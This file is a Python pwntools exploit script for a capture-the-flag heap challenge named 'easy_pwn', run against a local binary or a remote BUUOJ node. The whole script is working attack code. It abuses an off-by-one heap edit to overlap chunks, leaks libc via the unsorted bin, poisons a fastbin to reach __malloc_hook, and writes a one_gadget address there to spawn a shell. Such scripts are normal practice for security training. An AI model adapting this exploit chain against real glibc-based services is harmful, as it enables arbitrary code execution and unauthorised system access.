import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./easy_pwn')
	elf=ELF('./easy_pwn')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else :
	io=remote('node3.buuoj.cn',28784)
	elf=ELF('./easy_pwn')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def add(a):
	io.sendlineafter(': ','1')
	io.sendlineafter(': ',str(a))

def edit(a,b,c):
	io.sendlineafter(': ','2')
	io.sendlineafter(': ',str(a))
	io.sendlineafter(': ',str(b))
	io.sendlineafter(': ',c)

def show(a):
	io.sendlineafter(': ','4')
	io.sendlineafter(': ',str(a))

def delete(a):
	io.sendlineafter(': ','3')
	io.sendlineafter(': ',str(a))


add(0x90)
add(0x18)
add(0x18)
add(0x80)
add(0x18)

delete(0)
edit(2,0x22,'2'*0x10+p64(0xe0)+'\x90')

delete(3)
add(0x90)
show(1)

io.recv(9)
malloc_hook_addr=u64(io.recv(6)+"\x00\x00")-0x10-88
libc.address=malloc_hook_addr-libc.sym['__malloc_hook']
success('libc_base:'+hex(libc.address))
success('malloc_hook_addr:'+hex(malloc_hook_addr))

add(0x68)
delete(1)
edit(3,0x68,p64(malloc_hook_addr-0x23)+'\x00'*0x60)
add(0x68)
add(0x68)
edit(5,0x1b,'a'*0xb+p64(libc.address+0xf1147)+p64(libc.sym['realloc']+20))


delete(1)
delete(3)




gdb.attach(io)
pause()
io.interactive()